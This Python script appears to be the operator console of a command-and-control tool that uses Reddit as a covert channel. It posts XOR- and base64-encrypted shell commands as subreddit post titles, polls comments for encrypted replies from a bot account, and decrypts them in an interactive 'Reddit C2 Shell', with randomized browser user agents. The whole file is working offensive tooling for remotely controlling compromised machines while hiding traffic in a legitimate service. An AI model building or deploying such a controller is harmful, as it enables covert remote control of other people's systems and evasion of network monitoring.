import praw
import time
import os
import random
import string
import re
import base64

# CONFIGURATION
SUBREDDIT_NAME = ""
BOT_USERNAME = ""
XOR_KEY = ""

# Set your Reddit credentials
reddit = praw.Reddit(
    client_id='',
    client_secret='',
    username='',
    password='',
    user_agent='X-Test-Script'
)

def generate_user_agent():
    platforms = [
        "Windows NT 10.0; Win64; x64",
        "X11; Linux x86_64",
        "Macintosh; Intel Mac OS X 10_15_7"
    ]
    browser = random.choice(["Firefox", "Chrome", "Edge"])
    platform = random.choice(platforms)
    build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"Mozilla/5.0 ({platform}) {browser}/{build} RedditShellBot"

def xor_cipher(data: str, key: str = XOR_KEY, mode="encrypt") -> str:
    if mode == "encrypt":
        raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return base64.b64encode(raw.encode()).decode()
    elif mode == "decrypt":
        raw = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))

def send_command(command):
    encrypted = xor_cipher(command, mode="encrypt")
    subreddit = reddit.subreddit(SUBREDDIT_NAME)
    post = subreddit.submit(title=encrypted, selftext='')
    print(f"\n[+] Encrypted command sent")
    print(f"    Waiting for response at: https://www.reddit.com{post.permalink}")
    return post

def clean_response(message: str):
    return re.sub(r"<!--sep-\d+-->", "", message).strip()

def wait_for_response(post, timeout=180):
    start_time = time.time()
    while time.time() - start_time < timeout:
        post = reddit.submission(id=post.id)  # Force reload
        post.comments.replace_more(limit=0)
        for comment in post.comments:
            print(f"[DEBUG] Seen comment from {comment.author.name}")
            if comment.author.name == BOT_USERNAME:
                cleaned_body = clean_response(comment.body)
                return xor_cipher(cleaned_body, mode="decrypt")
        print("[...] Waiting for agent response...")
        time.sleep(5)
    return "[TIMEOUT] No response received from the bot."

def shell():
    print(f"=== Reddit C2 Shell (subreddit: r/{SUBREDDIT_NAME}) ===")
    print("Type a command or 'exit' to quit.\n")

    while True:
        try:
            command = input("> ").strip()
            if command.lower() in ["exit", "quit"]:
                break
            if not command:
                continue

            post = send_command(command)
            response = wait_for_response(post)
            print("\n[Decrypted bot response]\n")
            print(response)
            print("\n--- Command completed ---\n")

        except KeyboardInterrupt:
            print("\n[!] Exiting.")
            break
        except Exception as e:
            print(f"[ERROR] {e}")

if __name__ == "__main__":
    shell()
